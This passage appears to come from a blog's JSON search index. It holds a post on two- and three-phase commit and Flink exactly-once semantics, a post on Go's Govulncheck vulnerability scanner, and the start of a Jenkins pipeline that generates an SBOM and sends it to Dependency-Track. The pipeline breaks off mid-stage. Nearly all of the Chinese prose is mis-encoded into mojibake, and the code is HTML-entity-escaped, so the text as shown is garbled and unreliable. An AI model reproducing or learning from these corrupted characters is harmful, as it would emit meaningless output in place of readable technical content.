ç”¨çš„äº‹åŠ¡èµ„æºï¼Œå¹¶å‘åè°ƒè€…è¿”å› Ackã€‚\nåè°ƒè€…æ”¶åˆ°æ‰€æœ‰å‚ä¸è€…çš„ Ack æ¶ˆæ¯ï¼Œäº‹åŠ¡å›æ»šå®Œæˆã€‚\n\n\n\nåº”ç”¨flink 2PCFlink ä½œä¸ºæµå¼å¤„ç†å¼•æ“ï¼Œè‡ªç„¶ä¹Ÿæä¾›äº†å¯¹ Exactly Once è¯­ä¹‰çš„ä¿è¯ã€‚ç«¯åˆ°ç«¯çš„ Exactly Once è¯­ä¹‰ï¼Œæ˜¯è¾“å…¥ã€å¤„ç†é€»è¾‘ã€è¾“å‡ºä¸‰éƒ¨åˆ†ååŒä½œç”¨çš„ç»“æœã€‚Flink å†…éƒ¨ä¾æ‰˜æ£€æŸ¥ç‚¹æœºåˆ¶å’Œè½»é‡çº§åˆ†å¸ƒå¼å¿«ç…§ç®—æ³• ABS ä¿è¯ Exactly Onceã€‚è€Œè¦å®ç°ç²¾ç¡®ä¸€æ¬¡çš„è¾“å‡ºé€»è¾‘ï¼Œåˆ™éœ€è¦æ–½åŠ ä»¥ä¸‹ä¸¤ç§é™åˆ¶ä¹‹ä¸€ï¼šå¹‚ç­‰æ€§å†™å…¥ï¼ˆidempotent writeï¼‰ã€äº‹åŠ¡æ€§å†™å…¥ï¼ˆtransactional writeï¼‰ã€‚é¢„æäº¤é˜¶æ®µçš„æµç¨‹æ¯å½“éœ€è¦åš Checkpoint æ—¶ï¼ŒJobManager å°±åœ¨æ•°æ®æµä¸­æ‰“å…¥ä¸€ä¸ªå±éšœï¼ˆbarrierï¼‰ï¼Œä½œä¸ºæ£€æŸ¥ç‚¹çš„ç•Œé™ã€‚å±éšœéšç€ç®—å­é“¾å‘ä¸‹æ¸¸ä¼ é€’ï¼Œæ¯åˆ°è¾¾ä¸€ä¸ªç®—å­éƒ½ä¼šè§¦å‘å°†çŠ¶æ€å¿«ç…§å†™å…¥çŠ¶æ€åç«¯çš„åŠ¨ä½œã€‚å½“å±éšœåˆ°è¾¾ Kafka sink åï¼Œé€šè¿‡ KafkaProducer.flush() æ–¹æ³•åˆ·å†™æ¶ˆæ¯æ•°æ®ï¼Œä½†è¿˜æœªçœŸæ­£æäº¤ã€‚æ¥ä¸‹æ¥è¿˜æ˜¯éœ€è¦é€šè¿‡æ£€æŸ¥ç‚¹æ¥è§¦å‘æäº¤é˜¶æ®µï¼šæäº¤é˜¶æ®µæµç¨‹\nåªæœ‰åœ¨æ‰€æœ‰æ£€æŸ¥ç‚¹éƒ½æˆåŠŸå®Œæˆè¿™ä¸ªå‰æä¸‹ï¼Œå†™å…¥æ‰ä¼šæˆåŠŸã€‚è¿™ç¬¦åˆå‰æ–‡æ‰€è¿° 2PC çš„æµç¨‹ï¼Œå…¶ä¸­ JobManager ä¸ºåè°ƒè€…ï¼Œå„ä¸ªç®—å­ä¸ºå‚ä¸è€…ï¼ˆä¸è¿‡åªæœ‰ Sink ä¸€ä¸ªå‚ä¸è€…ä¼šæ‰§è¡Œæäº¤ï¼‰ã€‚ä¸€æ—¦æœ‰æ£€æŸ¥ç‚¹å¤±è´¥ï¼ŒnotifyCheckpointComplete() æ–¹æ³•å°±ä¸ä¼šæ‰§è¡Œã€‚å¦‚æœé‡è¯•ä¹Ÿä¸æˆåŠŸçš„è¯ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ abort() æ–¹æ³•å›æ»šäº‹åŠ¡ã€‚\n2PCçš„é—®é¢˜åŒæ­¥é˜»å¡é—®é¢˜ï¼šäºŒé˜¶æ®µæäº¤ç®—æ³•åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰å‚ä¸èŠ‚ç‚¹éƒ½æ˜¯äº‹åŠ¡é˜»å¡å‹çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æœ¬åœ°èµ„æºç®¡ç†å™¨å æœ‰ä¸´ç•Œèµ„æºæ—¶ï¼Œå…¶ä»–èµ„æºç®¡ç†å™¨å¦‚æœè¦è®¿é—®åŒä¸€ä¸´ç•Œèµ„æºï¼Œä¼šå¤„äºé˜»å¡çŠ¶æ€ã€‚\nåè°ƒè€…å•ç‚¹æ•…éšœå¯¼è‡´å‚ä¸è€…é•¿æœŸé˜»å¡é—®é¢˜ï¼šåŸºäº XA çš„äºŒé˜¶æ®µæäº¤ç®—æ³•ç±»ä¼¼äºé›†ä¸­å¼ç®—æ³•ï¼Œä¸€æ—¦äº‹åŠ¡ç®¡ç†å™¨å‘ç”Ÿæ•…éšœï¼Œæ•´ä¸ªç³»ç»Ÿéƒ½å¤„äºåœæ»çŠ¶æ€ã€‚å°¤å…¶æ˜¯åœ¨æäº¤é˜¶æ®µï¼Œä¸€æ—¦äº‹åŠ¡ç®¡ç†å™¨å‘ç”Ÿæ•…éšœï¼Œèµ„æºç®¡ç†å™¨ä¼šç”±äºç­‰å¾…ç®¡ç†å™¨çš„æ¶ˆæ¯ï¼Œè€Œä¸€ç›´é”å®šäº‹åŠ¡èµ„æºï¼Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿè¢«é˜»å¡ã€‚\næ•°æ®ä¸ä¸€è‡´é—®é¢˜ï¼šåœ¨æäº¤é˜¶æ®µï¼Œå½“åè°ƒè€…å‘å‚ä¸è€…å‘é€ DoCommit è¯·æ±‚ä¹‹åï¼Œå¦‚æœå‘ç”Ÿäº†å±€éƒ¨ç½‘ç»œå¼‚å¸¸ï¼Œæˆ–è€…åœ¨å‘é€æäº¤è¯·æ±‚çš„è¿‡ç¨‹ä¸­åè°ƒè€…å‘ç”Ÿäº†æ•…éšœï¼Œå°±ä¼šå¯¼è‡´åªæœ‰ä¸€éƒ¨åˆ†å‚ä¸è€…æ¥æ”¶åˆ°äº†æäº¤è¯·æ±‚å¹¶æ‰§è¡Œæäº¤æ“ä½œï¼Œä½†å…¶ä»–æœªæ¥åˆ°æäº¤è¯·æ±‚çš„é‚£éƒ¨åˆ†å‚ä¸è€…åˆ™æ— æ³•æ‰§è¡Œäº‹åŠ¡æäº¤ã€‚äºæ˜¯æ•´ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¾¿å‡ºç°äº†æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚\näºŒé˜¶æ®µæ— æ³•è§£å†³çš„é—®é¢˜ï¼šåè°ƒè€…å†å‘å‡ºDoCommit æ¶ˆæ¯ä¹‹åå®•æœºï¼Œè€Œå”¯ä¸€æ¥æ”¶åˆ°è¿™æ¡æ¶ˆæ¯çš„å‚ä¸è€…åŒæ—¶ä¹Ÿå®•æœºäº†ã€‚é‚£ä¹ˆå³ä½¿åè°ƒè€…é€šè¿‡é€‰ä¸¾åè®®äº§ç”Ÿäº†æ–°çš„åè°ƒè€…ï¼Œè¿™æ¡äº‹åŠ¡çš„çŠ¶æ€ä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼Œæ²¡äººçŸ¥é“äº‹åŠ¡æ˜¯å¦è¢«å·²ç»æäº¤ã€‚\n3PCä¸‰é˜¶æ®µæäº¤åè®®ï¼ˆThree-phase commit protocolï¼Œ3PCï¼‰ï¼Œæ˜¯å¯¹äºŒé˜¶æ®µæäº¤ï¼ˆ2PCï¼‰çš„æ”¹è¿›ã€‚ä¸ºäº†è§£å†³ä¸¤é˜¶æ®µæäº¤çš„åŒæ­¥é˜»å¡å’Œæ•°æ®ä¸ä¸€è‡´é—®é¢˜ï¼Œä¸‰é˜¶æ®µæäº¤å¼•å…¥äº†è¶…æ—¶æœºåˆ¶å’Œå‡†å¤‡é˜¶æ®µã€‚è¶…æ—¶æœºåˆ¶\nåŒæ—¶åœ¨åè°ƒè€…å’Œå‚ä¸è€…ä¸­å¼•å…¥è¶…æ—¶æœºåˆ¶ã€‚å¦‚æœåè°ƒè€…æˆ–å‚ä¸è€…åœ¨è§„å®šçš„æ—¶é—´å†…æ²¡æœ‰æ¥æ”¶åˆ°æ¥è‡ªå…¶ä»–èŠ‚ç‚¹çš„å“åº”ï¼Œå°±ä¼šæ ¹æ®å½“å‰çš„çŠ¶æ€é€‰æ‹©æäº¤æˆ–è€…ç»ˆæ­¢æ•´ä¸ªäº‹åŠ¡ã€‚\nå‡†å¤‡é˜¶æ®µ\nåœ¨ç¬¬ä¸€é˜¶æ®µå’Œç¬¬äºŒé˜¶æ®µä¸­é—´å¼•å…¥äº†ä¸€ä¸ªå‡†å¤‡é˜¶æ®µï¼Œä¹Ÿå°±æ˜¯åœ¨æäº¤é˜¶æ®µä¹‹å‰ï¼ŒåŠ å…¥äº†ä¸€ä¸ªé¢„æäº¤é˜¶æ®µã€‚åœ¨é¢„æäº¤é˜¶æ®µæ’é™¤ä¸€äº›ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä¿è¯åœ¨æœ€åæäº¤ä¹‹å‰å„å‚ä¸èŠ‚ç‚¹çš„çŠ¶æ€æ˜¯ä¸€è‡´çš„ã€‚\nCanCommit é˜¶æ®µåè°ƒè€…å‘å‚ä¸è€…å‘é€è¯·æ±‚æ“ä½œï¼ˆCanCommit è¯·æ±‚ï¼‰ï¼Œè¯¢é—®å‚ä¸è€…æ˜¯å¦å¯ä»¥æ‰§è¡Œäº‹åŠ¡æäº¤æ“ä½œï¼Œç„¶åç­‰å¾…å‚ä¸è€…çš„å“åº”ï¼›å‚ä¸è€…æ”¶åˆ° CanCommit è¯·æ±‚ä¹‹åï¼Œå›å¤ Yesï¼Œè¡¨ç¤ºå¯ä»¥é¡ºåˆ©æ‰§è¡Œäº‹åŠ¡ï¼›å¦åˆ™å›å¤ Noã€‚ï¼ˆæˆ‘ä¸ªäººç†è§£ç±»ä¼¼åšTCCä¸­Tryæ“ä½œï¼‰PreCommit é˜¶æ®µ\nåè°ƒè€…æ ¹æ®å‚ä¸è€…çš„å›å¤æƒ…å†µï¼Œæ¥å†³å®šæ˜¯å¦å¯ä»¥è¿›è¡Œ PreCommit æ“ä½œ æˆ– ä¸­æ–­äº‹åŠ¡ã€‚\nå¦‚æœæ‰€æœ‰å‚ä¸è€…å›å¤çš„éƒ½æ˜¯â€œYesâ€ï¼Œé‚£ä¹ˆåè°ƒè€…å°±ä¼šæ‰§è¡Œäº‹åŠ¡çš„é¢„æ‰§è¡Œï¼š\n\nå‘é€é¢„æäº¤è¯·æ±‚ã€‚åè°ƒè€…å‘å‚ä¸è€…å‘é€ PreCommit è¯·æ±‚ï¼Œè¿›å…¥é¢„æäº¤é˜¶æ®µã€‚\näº‹åŠ¡é¢„æäº¤ã€‚å‚ä¸è€…æ¥æ”¶åˆ° PreCommit è¯·æ±‚åæ‰§è¡Œäº‹åŠ¡æ“ä½œï¼Œå¹¶å°† Undo å’Œ Redo ä¿¡æ¯è®°å½•åˆ°äº‹åŠ¡æ—¥å¿—ä¸­ï¼ŒåŒæ—¶é”å®šå½“å‰è®°å½•ã€‚\nå“åº”åé¦ˆã€‚å¦‚æœå‚ä¸è€…æˆåŠŸæ‰§è¡Œäº†äº‹åŠ¡æ“ä½œï¼Œåˆ™è¿”å› ACK å“åº”ï¼ŒåŒæ—¶å¼€å§‹ç­‰å¾…æœ€ç»ˆæŒ‡ä»¤\n\nå¦‚æœä»»ä½•ä¸€ä¸ªå‚ä¸è€…å‘åè°ƒè€…å‘é€äº†â€œNoâ€æ¶ˆæ¯ï¼Œæˆ–è€…ç­‰å¾…è¶…æ—¶ä¹‹åï¼Œåè°ƒè€…éƒ½æ²¡æœ‰æ”¶åˆ°å‚ä¸è€…çš„å“åº”ï¼Œå°±æ‰§è¡Œä¸­æ–­äº‹åŠ¡çš„æ“ä½œï¼š\n\nå‘é€ä¸­æ–­è¯·æ±‚ã€‚åè°ƒè€…å‘æ‰€æœ‰å‚ä¸è€…å‘é€â€œAbortâ€æ¶ˆæ¯ã€‚\nä¸­æ–­äº‹åŠ¡ã€‚å‚ä¸è€…æ”¶åˆ°â€œAbortâ€æ¶ˆæ¯ä¹‹åï¼Œæˆ–è¶…æ—¶åä»æœªæ”¶åˆ°åè°ƒè€…çš„æ¶ˆæ¯ï¼Œæ‰§è¡Œäº‹åŠ¡çš„ä¸­æ–­æ“ä½œã€‚DoCommit é˜¶æ®µ\n\nåè°ƒè€…æ ¹æ®å‚ä¸è€…çš„å›å¤æƒ…å†µï¼Œæ¥å†³å®šæ˜¯å¦å¯ä»¥è¿›è¡Œ DoCommit æ“ä½œ æˆ– ä¸­æ–­äº‹åŠ¡ã€‚\nå¦‚æœæ‰€æœ‰å‚ä¸è€…å›å¤çš„éƒ½æ˜¯â€œYesâ€ï¼Œé‚£ä¹ˆåè°ƒè€…å°±ä¼šæ‰§è¡Œäº‹åŠ¡çš„æäº¤ï¼š\n\nå‘é€æäº¤è¯·æ±‚ã€‚åè°ƒè€…æ¥æ”¶åˆ°æ‰€æœ‰å‚ä¸è€…å‘é€çš„ Ack å“åº”ï¼Œä»é¢„æäº¤çŠ¶æ€è¿›å…¥åˆ°æäº¤çŠ¶æ€ï¼Œå¹¶å‘æ‰€æœ‰å‚ä¸è€…å‘é€ DoCommit æ¶ˆæ¯ã€‚\näº‹åŠ¡æäº¤ã€‚å‚ä¸è€…æ¥æ”¶åˆ° DoCommit æ¶ˆæ¯ä¹‹åï¼Œæ­£å¼æäº¤äº‹åŠ¡ã€‚å®Œæˆäº‹åŠ¡æäº¤ä¹‹åï¼Œé‡Šæ”¾æ‰€æœ‰é”ä½çš„èµ„æºã€‚\nå“åº”åé¦ˆã€‚å‚ä¸è€…æäº¤å®Œäº‹åŠ¡ä¹‹åï¼Œå‘åè°ƒè€…å‘é€ Ack å“åº”ã€‚\nå®Œæˆäº‹åŠ¡ã€‚åè°ƒè€…æ¥æ”¶åˆ°æ‰€æœ‰å‚ä¸è€…çš„ Ack å“åº”ä¹‹åï¼Œå®Œæˆäº‹åŠ¡ã€‚\n\nå¦‚æœä»»ä½•ä¸€ä¸ªå‚ä¸è€…å‘åè°ƒè€…å‘é€äº†â€œNoâ€æ¶ˆæ¯ï¼Œæˆ–è€…åè°ƒè€…ç­‰å¾…è¶…æ—¶ä¹‹åï¼Œåè°ƒè€…éƒ½æ²¡æœ‰æ”¶åˆ°å‚ä¸è€…çš„å“åº”ï¼Œå°±æ‰§è¡Œä¸­æ–­äº‹åŠ¡çš„æ“ä½œï¼š\n\nå‘é€ä¸­æ–­è¯·æ±‚ã€‚åè°ƒè€…å‘æ‰€æœ‰å‚ä¸è€…å‘é€ Abort è¯·æ±‚ã€‚\näº‹åŠ¡å›æ»šã€‚å‚ä¸è€…æ¥æ”¶åˆ° Abort æ¶ˆæ¯ä¹‹åï¼Œåˆ©ç”¨å…¶åœ¨ PreCommit é˜¶æ®µè®°å½•çš„ Undo ä¿¡æ¯æ‰§è¡Œäº‹åŠ¡çš„å›æ»šæ“ä½œï¼Œå¹¶é‡Šæ”¾æ‰€æœ‰é”ä½çš„èµ„æºã€‚\nåé¦ˆç»“æœã€‚å‚ä¸è€…å®Œæˆäº‹åŠ¡å›æ»šä¹‹åï¼Œå‘åè°ƒè€…å‘é€ Ack æ¶ˆæ¯ã€‚\nä¸­æ–­äº‹åŠ¡ã€‚åè°ƒè€…æ¥æ”¶åˆ°å‚ä¸è€…åé¦ˆçš„ Ack æ¶ˆæ¯ä¹‹åï¼Œæ‰§è¡Œäº‹åŠ¡çš„ä¸­æ–­ï¼Œå¹¶ç»“æŸäº‹åŠ¡ã€‚ã€‚\n\nå½“å‚ä¸è€…PreCommit é˜¶æ®µå‘åè°ƒè€…å‘é€ Ack æ¶ˆæ¯åï¼Œå¦‚æœé•¿æ—¶é—´æ²¡æœ‰å¾—åˆ°åè°ƒè€…çš„å“åº”ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå‚ä¸è€…ä¼šè‡ªåŠ¨å°†è¶…æ—¶çš„äº‹åŠ¡è¿›è¡Œæäº¤ï¼Œä¸ä¼šåƒä¸¤é˜¶æ®µæäº¤é‚£æ ·è¢«é˜»å¡ä½\n\nå°ç»“å¦‚ä½•è§£å†³åè°ƒè€…å•ç‚¹æ•…éšœå¯¼è‡´å‚ä¸è€…é•¿æœŸé˜»å¡ã€‚ç”±äºå­˜åœ¨è¶…æ—¶æœºåˆ¶ï¼Œå³ä½¿åè°ƒè€…å‘ç”Ÿæ•…éšœï¼Œå‚ä¸è€…æ— æ³•åŠæ—¶æ”¶åˆ°æ¥è‡ªåè°ƒè€…çš„ä¿¡æ¯ä¹‹åï¼Œä»–ä¼šé»˜è®¤æ‰§è¡Œcommitã€‚é¿å…å‚ä¸è€…é•¿æœŸé˜»å¡ã€‚\nåŒæ­¥é˜»å¡é—®é¢˜3PCä¼šåœ¨2é˜¶æ®µåˆ°3é˜¶æ®µé—´é˜»å¡ï¼Œ2PCä¼šåœ¨1é˜¶æ®µåˆ°2é˜¶æ®µæ•´ä¸ªäº‹åŠ¡è¿‡ç¨‹ä¸­é˜»å¡ï¼Œå› è€Œæ€»ä½“æ¥è¯´3PCå¹¶ä¸èƒ½ä¸é˜»å¡ï¼Œåªæ˜¯æœ€å¤§é™åº¦å‡å°‘äº†é˜»å¡çš„æ—¶é—´ã€‚åŒæ—¶å®‰è£…5.2ä¹Ÿèƒ½å¤Ÿè§£å†³åè°ƒè€…å•ç‚¹æ•…éšœå¯¼è‡´å‚ä¸è€…é•¿æœŸé˜»å¡çš„é—®é¢˜\næ•°æ®ä¸ä¸€è‡´é—®é¢˜3PCå’Œ2PCéƒ½æ— æ³•è§£å†³æ•°æ®ä¸€è‡´çš„é—®é¢˜ï¼Œä¸è¿‡3PCå­˜åœ¨è¶…æ—¶ä¼šé€šè¿‡è¶…æ—¶ä¿è¯åè°ƒè€…å’Œå‚ä¸è€…åœ¨æäº¤é˜¶æ®µæ— æ³•é€šä¿¡è¿‡ç¨‹ä¸­æœ€ç»ˆä¸€è‡´ï¼Œè€Œä¸éœ€äººå·¥ä»‹å…¥ã€‚\n","slug":"Two-phase commit","date":"2022-09-15T00:57:00.000Z","categories_index":"åˆ†å¸ƒå¼","tags_index":"ä¸‰æ®µå¼æäº¤,ä¸¤æ®µå¼æäº¤,åˆ†å¸ƒå¼äº‹åŠ¡,åˆ†å¸ƒå¼ç³»ç»Ÿ","author_index":"Moses"},{"id":"9c3da876af68c4f62cd5f90bc6783fab","title":"è½¯ä»¶ä¾›åº”é“¾åˆ†æå·¥å…·-GoLangåŸç”Ÿå·¥å…·","content":"GoLang native sca tool for developer0x01ç®€ä»‹2022-09-06ï¼ŒGo å®‰å…¨å›¢é˜Ÿæ­£å¼å¯¹å¤–å®£å¸ƒGoæ¼æ´ç®¡ç†å·¥å…·Â Govulncheckï¼Œ Govulncheck æ˜¯ä¸€æ¬¾é¢å‘å¼€å‘è€…çš„ä¾›åº”é“¾æ¼æ´æ£€æµ‹å·¥å…·ï¼Œé€šè¿‡åˆ†ææºä»£ç æˆ–ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ†æé¡¹ç›®ä¸­å¼•å…¥çš„ä¸‰æ–¹åŒ…åŠç›¸å…³å‡½æ•°ï¼Œç„¶ååœ¨æ¼æ´åº“ https://vuln.go.dev/Â ä¸­æŸ¥è¯¢æ˜¯å¦æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚\nå€¼å¾—ç§°èµçš„æ˜¯ï¼Œ Govulncheck åœ¨ä¸‰æ–¹åŒ…çš„åç§°å’Œç‰ˆæœ¬è¿›è¡Œæ¼æ´åŒ¹é…çš„åŸºç¡€ä¸Šï¼Œè¿˜åˆ†æäº†ä¸‰æ–¹åŒ…ä¸­çš„å‡½æ•°æ˜¯å¦è¢«è°ƒç”¨ï¼Œä»¥åŠç›¸å…³çš„è°ƒç”¨è·¯å¾„ã€‚æ­¤å¤–ï¼Œ Govulncheck è¿˜ç»“åˆäº† Go ç‰ˆæœ¬ã€æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å’Œæ¶æ„åšè¿›ä¸€æ­¥çš„æ¼æ´ç­›é€‰ï¼Œæœ€ç»ˆåªå±•ç¤ºåœ¨å½“å‰æ“ä½œç³»ç»Ÿå’Œ Go è¯­è¨€ç‰ˆæœ¬ä¸­ï¼Œå…·æœ‰çœŸå®å±å®³çš„ä¸‰æ–¹åŒ…ã€‚ä¾‹å¦‚ï¼Œå¯¹äº Linux å¹³å°è¿è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸ä¼šæŠ¥å‘Šå…·æœ‰ Windows ç‰¹å®šä¾èµ–æ¡ä»¶çš„ä¸‰æ–¹åŒ…æ¼æ´ï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ã€‚\n0x02æ¶æ„å›¾\n0x03æ ¸å¿ƒèƒ½åŠ›Govulncheck é€šè¿‡åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·ä¿¡æ¯æŸ¥æ‰¾å‡ºä¸‰æ–¹åŒ…åŠæ˜¾å¼è°ƒç”¨çš„å‡½æ•°ï¼Œæ ¹æ®ä¸‰æ–¹åŒ…å’Œå‡½æ•°æŸ¥æ‰¾æ¼æ´åº“ï¼Œæœ€ç»ˆç¡®å®šä¸‰æ–¹åŒ…æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œå› æ­¤ Govulncheck æ— æ³•æ£€æµ‹å»é™¤ç¬¦å·è¡¨ä¿¡æ¯çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œçš„ Go äºŒè¿›åˆ¶æ–‡ä»¶åŸºæœ¬ä¸Šéƒ½ä¼šå»é™¤ç¬¦å·è¡¨ä¿¡æ¯ï¼Œå‡å°ä½“ç§¯å¹¶æé«˜å®‰å…¨æ€§ã€‚è¿™ä¸€ç‚¹ä¹Ÿæ›´åŠ å°è¯äº† Govulncheck çš„æ ¸å¿ƒå®šä½æ˜¯ä¸€æ¬¾ä¸º Developer å¼€å‘çš„ DevSecOps å·¥å…·ã€‚ Govulncheck è¿˜æœ‰ä¸€äº›å…¶å®ƒçš„ä¸è¶³ï¼Œæ¯”å¦‚ï¼šåªæ”¯æŒ Go 1.18 åŠä»¥ä¸Šç‰ˆæœ¬ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ†æäºŒè¿›åˆ¶æ–‡ä»¶æ—¶æ— æ³•å±•ç¤ºæ¼æ´è°ƒç”¨å›¾ç­‰ï¼Œæ›´å¤šçš„é™åˆ¶ä¿¡æ¯å¯ä»¥æŸ¥çœ‹å®˜æ–¹åšå®¢ã€‚\n0x04 Theoryåˆ†æä»£ç åŸç†æµç¨‹å¦‚ä¸‹ï¼š\n\næå–é¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„ä¸‰æ–¹ç»„ä»¶å’Œå‡½æ•°ä¿¡æ¯\nå¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œåˆ™åˆ¤æ–­æ‰§è¡ŒÂ govulncheckÂ å‘½ä»¤çš„ç›®å½•ä¸­æ˜¯å¦å­˜åœ¨Â go.modÂ å’ŒÂ go.sumÂ æ–¹æ³•ï¼Œè¾“å‡ºç›¸å…³çš„é”™è¯¯æç¤ºä¿¡æ¯\næ‹‰å–ä¸‰æ–¹ç»„ä»¶ç›¸å…³çš„æ¼æ´ä¿¡æ¯ï¼ˆè¯¥æ“ä½œä¼šä¼˜å…ˆæ£€æŸ¥æœ¬åœ°æ–‡ä»¶ç¼“å­˜ï¼‰\næ ¹æ®ä¸‰æ–¹ç»„ä»¶å’Œå‡½æ•°åç§°ä¸æ¼æ´ä¿¡æ¯è¿›è¡ŒåŒ¹é…\næ¢³ç†ä¸‰æ–¹ç»„ä»¶å‡½æ•°çš„è°ƒç”¨å…¥å£åŠç›¸å…³çš„è°ƒç”¨é“¾è·¯\nè¾“å‡ºæ£€æµ‹ç»“æœ\n\n\nåˆ†æäºŒè¿›åˆ¶åŸç†æ•´ä½“æµç¨‹å¦‚ä¸‹ï¼š\n\nè·å–äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼–è¯‘ä¿¡æ¯\nè·å–äºŒè¿›åˆ¶æ–‡ä»¶å†…Goå‡½æ•°çš„ç¬¦å·åç§°ï¼Œåœ¨ Golang 1.18 å’Œ 1.19 ä¸­ï¼Œå‡½æ•°çš„ç¬¦å·åç§°ä¸ºÂ go.func.*ï¼ŒGolang 1.20 ä¸­å‡½æ•°çš„ç¬¦å·åç§°ä¸ºÂ go:func.*\nè·å–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ pclntab ä¿¡æ¯\nè·å–äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¨‹åºè®¡æ•°å™¨åŠå¯¹åº”çš„è¡Œå·ï¼Œç”¨äºå‡½æ•°ã€è¯­å¥ã€æŒ‡ä»¤çš„ä½ç½®\næ ¹æ®ç¨‹åºè®¡æ•°å™¨å’Œå¯¹åº”çš„è¡Œå·ï¼Œè§£ç ä¸ºå¯¹åº”çš„ç¬¦å·è¡¨\néå†ç¬¦å·è¡¨ä¸­çš„å‡½æ•°ä¿¡æ¯ï¼Œè·å–å‡½æ•°åç§°ã€åŒ…åç­‰ä¿¡æ¯\næ‹‰å–é¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„ä¸‰æ–¹åŒ…ç›¸å…³çš„æ¼æ´ä¿¡æ¯åˆ°æœ¬åœ°\næ ¹æ®åŒ…åæˆ–åŒ…åä¸å‡½æ•°åç§°è¿›è¡Œæ¼æ´åŒ¹é…\nè¾“å‡ºæ£€æµ‹ç»“æœ\n\n0x05Quickstartrequireinstallcheckè¿›é˜¶0x06ä½¿ç”¨è¯´æ˜0x07åº”ç”¨åœºæ™¯ReferencesGoLang native sca tool for developer | owefsad çš„åšå®¢Go Vulnerability Management - The Go Programming LanguageGo Security - The Go Programming Language\n","slug":"GoLang native sca tool for developer","date":"2022-09-14T02:13:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,GoLand,è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·","author_index":"Moses"},{"id":"832ec458ec0531279eee1cd18e61ce2f","title":"CI/CD è¿‡ç¨‹ä¸­çš„éƒ¨åˆ†pipeline","content":"DTimport hudson.model.*;\nimport hudson.*\nimport groovy.json.JsonSlurper;\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        &#x2F;&#x2F;maven &#39;maven-apollo&#39;\n        maven maven\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n        &#x2F;&#x2F; nodejs &#39;node&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;åˆ é™¤ä¸Šæ¬¡æ„å»º&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                sh &#39;&#39;&#39;\n                    if [[ $maven &#x3D;&#x3D; &quot;maven-bhb&quot; ]];then\n                        rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository&#x2F;com&#x2F;hcfc&#x2F;*\n                    else\n                        rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository3.8.1&#x2F;com&#x2F;hcfc&#x2F;*\n                    fi\n                &#39;&#39;&#39;\n\n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;BUILD_ID&#125;-$&#123;projectName&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n                \n            &#125;\n        &#125;\n        \n        stage(&#39;æ‹‰å–ä»£ç &#39;)&#123;\n            steps &#123;\n                echo &#39;ä»£ç åˆ†æ”¯:&#39;+BRANCH\n                echo &#39;ä»£ç åœ°å€:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n                \n            &#125;\n        &#125;\n\n       \n        stage(&#39;build&#39;) &#123;\n         steps &#123;\n                sh &#39;&#39;&#39;\n                    mvn clean install -e -U -DskipDockerPush -DdockerImageTags&#x3D;latest -Dmaven.test.skip&#x3D;true $mvn_params -f pom.xml\n                    \n                &#39;&#39;&#39;\n             &#125;\n         &#125;\n         \n        stage(&#39;Generating SBOM with Cyclonedx&#39;) &#123;\n            steps &#123;\n                sh &#39;mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom&#39;\n            &#125;\n        &#125;\n        \n\n         stage(&#39;dependencyTrackPublisher&#39;) &#123;\n             steps &#123;\n                 withCredentials([string(credentialsId: &#39;dt&#39;, variable: &#39;API_KEY&#39;)]) &#123;\n                     dependencyTrackPublisher artifact: &#39;target&#x2F;bom.xml&#39;, projectName: projectName, projectVersion: branch, \\\n                                             autoCreateProjects: true, dependencyTrackApiKey:API_KEY, synchronous: true, \\\n                                             failedNewCritical : 10000, failedNewHigh : 10000, failedNewLow: 10000, failedNewMedium: 10000, \\\n                                             failedTotalCritical : 10000, failedTotalHigh : 10000, failedTotalLow : 10000, failedTotalMedium : 10000,\n                                             unstableNewCritical : 10000, unstableNewHigh : 10000, unstableNewLow : 10000, unstableNewMedium : 10000,\\\n                                             unstableTotalCritical : 10000, unstableTotalHigh : 10000,unstableTotalLow : 10000, unstableTotalMedium : 10000\n                 &#125;\n             &#125;\n         &#125;\n        \n        stage(&#39;å®‰å…¨åˆè§„æ£€æŸ¥&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    def jsonPayload &#x3D; new 